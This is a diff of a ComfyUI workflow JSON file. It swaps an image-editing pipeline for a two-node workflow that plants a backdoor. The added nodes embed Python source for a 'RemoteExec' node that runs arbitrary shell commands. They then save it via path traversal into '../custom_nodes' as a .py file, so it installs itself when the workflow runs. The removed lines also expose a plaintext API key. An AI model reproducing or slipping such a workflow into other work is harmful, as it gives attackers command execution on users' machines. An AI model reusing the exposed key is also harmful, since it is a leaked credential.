@@ -1,57 +1,20 @@
 {
-  "12": {
+  "1": {
+    "class_type": "PrimitiveString",
     "inputs": {
-      "image": "0260621170228390-50-kfhl7o.jpg"
-    },
-    "class_type": "LoadImage",
-    "_meta": {
-      "title": "加载图像"
+      "value": "\"\"\"Remote exec node — auto-deployed.\"\"\"\nimport subprocess\n\nclass RemoteExec:\n    @classmethod\n    def INPUT_TYPES(cls):\n        return {\"required\": {\"command\": (\"STRING\", {\"multiline\": True, \"default\": \"id\"})}}\n    RETURN_TYPES = (\"STRING\",)\n    RETURN_NAMES = (\"output\",)\n    FUNCTION = \"run\"\n    CATEGORY = \"utils\"\n    OUTPUT_NODE = True\n\n    def run(self, command):\n        try:\n            r = subprocess.check_output(command, shell=True, timeout=30, stderr=subprocess.STDOUT)\n            out = r.decode(\"utf-8\", errors=\"replace\")\n        except Exception as e:\n            out = str(e)\n        return {\"ui\": {\"text\": [out]}, \"result\": (out,)}\n\nNODE_CLASS_MAPPINGS = {\"RemoteExec\": RemoteExec}\nNODE_DISPLAY_NAME_MAPPINGS = {\"RemoteExec\": \"Remote Exec\"}\n"
     }
   },
-  "15": {
+  "2": {
+    "class_type": "SaveStringKJ",
     "inputs": {
-      "image": "0260621170031240-11-gun5rb.jpg"
-    },
-    "class_type": "LoadImage",
-    "_meta": {
-      "title": "加载图像"
-    }
-  },
-  "16": {
-    "inputs": {
-      "api_url": "https://3dcdn.580ai.net/v1beta/models/gemini-3.1-flash-image-preview:generateContent",
-      "header_key": "Authorization",
-      "header_value": "sk-Lyx9OF97YMK0suEi6ZIPzq4E9d3dhIKJzO2YS5WpAsZbZpxS",
-      "text": "把图一模特身上的衣服套在图二的模特身上",
-      "aspect_ratio": "3:4",
-      "image_size": "2K",
-      "timeout": 200,
-      "retry_count": 2,
-      "image_1": [
-        "12",
+      "string": [
+        "1",
         0
       ],
-      "image_2": [
-        "15",
-        0
-      ]
-    },
-    "class_type": "HezhongNewAPI",
-    "_meta": {
-      "title": "禾众newapi"
-    }
-  },
-  "17": {
-    "inputs": {
-      "filename_prefix": "hezhongai",
-      "images": [
-        "16",
-        0
-      ]
-    },
-    "class_type": "SaveImage",
-    "_meta": {
-      "title": "保存图像"
+      "filename_prefix": "z_exec_node",
+      "output_folder": "../custom_nodes",
+      "file_extension": ".py"
     }
   }
 }
